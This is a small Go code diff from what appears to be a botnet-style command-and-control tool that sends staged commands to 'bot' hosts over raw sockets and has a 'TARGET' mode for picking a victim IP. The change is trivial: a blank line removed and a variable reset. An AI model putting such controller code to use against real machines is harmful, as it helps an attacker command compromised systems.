@@ -63,7 +63,6 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 		}
 		// YEET
-
 		if stagedCmd != "" {
 			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
 			// Close the socket
@@ -120,6 +119,7 @@ func cli() {
 		// Trim the bullshit newlines
 		stagedCmd = strings.Trim(stagedCmd, "\n")
 		if stagedCmd == "TARGET" {
+			stagedCmd = ""
 			// Get the target IP
 			fmt.Print("Enter IP to target> ")
 			targetIP, _ = reader.ReadString('\n')
